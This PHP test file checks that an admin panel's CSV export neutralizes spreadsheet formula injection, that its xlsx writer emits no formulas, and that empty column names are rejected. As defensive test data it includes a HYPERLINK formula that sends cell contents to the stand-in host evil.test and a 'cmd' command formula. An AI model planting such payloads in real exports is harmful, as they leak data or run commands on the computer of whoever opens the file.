<?php

declare(strict_types=1);

use PandaPanel\Actions\Exports\ExportColumn;
use PandaPanel\Actions\Imports\ImportColumn;
use PandaPanel\Exceptions\PanelSchemaException;
use PandaPanel\Support\Spreadsheet\Csv;
use PandaPanel\Support\Spreadsheet\Xlsx;

/*
 * CSV injection, and the two column mistakes beside it.
 *
 * A CSV cell beginning with `=`, `+`, `-` or `@` is a formula as far as Excel,
 * LibreOffice and Sheets are concerned, and they evaluate it when the file is
 * opened. The attacker is anyone who can write a text field; the victim is the
 * administrator who opens the export. CWE-1236.
 */

/**
 * @return list<string>
 */
function csvCells(string $line): array
{
    $handle = fopen('php://temp', 'r+');
    fwrite($handle, $line);
    rewind($handle);

    $row = fgetcsv($handle, escape: '') ?: [];
    fclose($handle);

    return array_map(strval(...), $row);
}

function csvLine(array $row, bool $escape = true): string
{
    $handle = fopen('php://temp', 'r+');
    Csv::write($handle, $row, $escape);
    rewind($handle);

    $line = stream_get_contents($handle);
    fclose($handle);

    return $line;
}

it('neutralizes every character a spreadsheet reads as a formula', function (): void {
    foreach (['=', '+', '-', '@', "\t", "\r"] as $prefix) {
        expect(Csv::neutralize($prefix.'SUM(A1)'))->toStartWith("'");
    }
});

it('neutralizes the exfiltration formula rather than merely quoting it', function (): void {
    $payload = '=HYPERLINK("http://evil.test?x="&A1,"Click me")';

    // Quoting is about parsing the file. It does nothing about what the cell
    // means once parsed, which is the whole of the problem.
    $cells = csvCells(csvLine([$payload]));

    expect($cells[0])->toBe("'".$payload)
        ->and($cells[0])->not->toStartWith('=');
});

it('neutralizes the command formula too', function (): void {
    expect(Csv::neutralize("=cmd|'/c calc'!A1"))->toBe("'=cmd|'/c calc'!A1");
});

it('leaves ordinary text exactly as it was', function (): void {
    foreach (['Apollo', '2026-08-15', 'a=b', '', '0'] as $value) {
        expect(Csv::neutralize($value))->toBe($value);
    }
});

it('can be turned off for a file another program parses', function (): void {
    // There, nothing evaluates anything and the apostrophe would be data
    // corruption rather than a fix.
    expect(csvCells(csvLine(['=SUM(A1)'], escape: false))[0])->toBe('=SUM(A1)');
});

it('needs no such thing in xlsx', function (): void {
    $path = tempnam(sys_get_temp_dir(), 'panel').'.xlsx';

    Xlsx::write($path, [['Formula'], ['=SUM(A1)']]);

    $zip = new ZipArchive;
    $zip->open($path);
    $sheet = (string) $zip->getFromName('xl/worksheets/sheet1.xml');
    $zip->close();
    unlink($path);

    // A formula in xlsx lives in an `<f>` element, which this writer never
    // emits: every cell is `t="inlineStr"` and is shown, not run.
    expect($sheet)->toContain('t="inlineStr"')
        ->and($sheet)->not->toContain('<f>')
        // Escaped as XML, and still the literal text.
        ->and($sheet)->toContain('=SUM(A1)');
});

/*
 * The column mistakes beside it
 */

it('refuses an export column with an empty name', function (): void {
    expect(fn () => ExportColumn::make(''))
        ->toThrow(PanelSchemaException::class, 'An export column was declared with an empty name');
});

it('refuses an import column with an empty name', function (): void {
    expect(fn () => ImportColumn::make('  '))
        ->toThrow(PanelSchemaException::class, 'An import column was declared with an empty name');
});
